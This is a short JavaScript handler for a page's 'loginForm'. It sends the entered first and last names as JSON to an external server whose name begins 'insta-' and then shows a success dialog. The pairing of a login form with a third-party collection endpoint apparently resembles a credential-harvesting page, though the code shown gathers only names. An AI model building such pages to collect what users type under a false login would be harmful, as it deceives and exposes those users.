const form = document.getElementById('loginForm');
const successModal = document.getElementById('successModal');

function openSuccessModal() {
  successModal.classList.add('is-open');
  successModal.setAttribute('aria-hidden', 'false');
}

function closeSuccessModal() {
  successModal.classList.remove('is-open');
  successModal.setAttribute('aria-hidden', 'true');
}

successModal.addEventListener('click', (e) => {
  if (e.target.matches('[data-modal-close]')) {
    closeSuccessModal();
  }
});

form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const firstName = document.getElementById('firstName').value.trim();
  const lastName = document.getElementById('lastName').value.trim();

  try {
    const response = await fetch('https://insta-n1bf.onrender.com/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ firstName, lastName })
    });

    if (!response.ok) {
      throw new Error('Request failed');
    }

    form.reset();
    openSuccessModal();
  } catch (error) {
    alert('Ошибка при отправке. Проверьте, что backend запущен.');
  }
});
